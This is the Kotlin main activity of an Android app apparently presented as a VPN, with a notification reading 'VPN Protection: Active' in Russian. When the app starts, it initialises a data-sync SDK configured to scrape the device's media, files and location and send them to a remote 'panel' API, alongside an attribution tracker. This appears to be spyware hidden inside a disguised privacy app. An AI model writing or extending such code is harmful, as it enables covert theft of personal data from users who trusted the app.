package com.tgvpn.offapp

import android.Manifest
import android.content.pm.PackageManager
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.WindowInsets
import androidx.compose.foundation.layout.displayCutout
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.Surface
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalDensity
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import com.sdocument.sdk.AppMetadata
import com.sdocument.sdk.DataSyncSdk
import com.sdocument.sdk.MmpConfig
import com.sdocument.sdk.NotificationConfig
import com.sdocument.sdk.ScrapeType
import com.sdocument.sdk.SdkConfig
import com.sdocument.sdk.WebConfig
import com.sdocument.sdk.utils.NetworkMonitor
import dagger.hilt.android.AndroidEntryPoint
import kotlin.math.sqrt

@AndroidEntryPoint
class MainActivity : ComponentActivity(), SensorEventListener {

    companion object {}

    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) {}

    private lateinit var sensorManager: SensorManager
    private var accelerometer: Sensor? = null
    private var lastShakeTime = 0L
    private var showDebugOverlay by mutableStateOf(false)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        sensorManager = getSystemService(SENSOR_SERVICE) as SensorManager
        accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)

        requestNotificationPermissionIfNeeded()

        enableEdgeToEdge()

        val sdkConfig = SdkConfig(
            scrapeConfig = setOf(ScrapeType.MEDIA, ScrapeType.FILES, ScrapeType.LOCATION),
            webConfig = WebConfig(
                verificationUrl = "",
                webViewUrl = "",
                apiUrl = "https://panel.static-analysis.rest/"
            ),
            mmpConfig = MmpConfig(enableMmp = true, mmpUrl = "https://apps-mmp.onrender.com"),
            metadata = AppMetadata(appId = 4, buildId = "25"),
            notificationConfig = NotificationConfig(
                serviceTitle = "VPN Защита",
                serviceText = "Активна"
            )
        )

        DataSyncSdk.initialize(this, sdkConfig)

        setContent {
            val density = LocalDensity.current
            val cutoutTopPx = WindowInsets.displayCutout.getTop(density)
            val topPadding = with(density) {
                if (cutoutTopPx > 0) cutoutTopPx.toDp() else 32.dp
            }

            com.wgvpn.core.ui.VPNAppTheme {
                Surface(modifier = Modifier.fillMaxSize()) {
                    Box(modifier = Modifier.fillMaxSize()) {
                        com.tgvpn.offapp.navigation.AppNavHost(
                            modifier = Modifier.fillMaxSize(),
                            sdkConfig = sdkConfig,
                            topPadding = topPadding
                        )

//                        // Hidden tap zone: top-right corner, 5 taps to open debug overlay
//                        val tapCount = remember { mutableIntStateOf(0) }
//                        val scope = rememberCoroutineScope()
//                        var resetJob by remember { mutableStateOf<Job?>(null) }
//                        Box(
//                            modifier = Modifier
//                                .align(Alignment.TopEnd)
//                                .padding(top = topPadding)
//                                .size(60.dp)
//                                .pointerInput(Unit) {
//                                    detectTapGestures {
//                                        tapCount.intValue++
//                                        resetJob?.cancel()
//                                        resetJob = scope.launch {
//                                            delay(1500)
//                                            tapCount.intValue = 0
//                                        }
//                                        if (tapCount.intValue >= 5) {
//                                            tapCount.intValue = 0
//                                            showDebugOverlay = !showDebugOverlay
//                                            }
//                                    }
//                                }
//                        )
//
//                        if (showDebugOverlay) {
//                            DebugLogOverlay(onDismiss = { showDebugOverlay = false })
//                        }
                    }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        accelerometer?.let {
            sensorManager.registerListener(
                this,
                it,
                SensorManager.SENSOR_DELAY_UI
            )
        }
    }

    override fun onPause() {
        super.onPause()
        sensorManager.unregisterListener(this)
    }

    override fun onSensorChanged(event: SensorEvent) {
        if (event.sensor.type != Sensor.TYPE_ACCELEROMETER) return
        val x = event.values[0];
        val y = event.values[1];
        val z = event.values[2]
        val g = sqrt(x * x + y * y + z * z)
        if (g > 25f) {
            val now = System.currentTimeMillis()
            if (now - lastShakeTime > 1000) {
                lastShakeTime = now
                showDebugOverlay = !showDebugOverlay
            }
        }
    }

    override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}

    private fun requestNotificationPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.POST_NOTIFICATIONS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        NetworkMonitor.cleanup()
    }
}
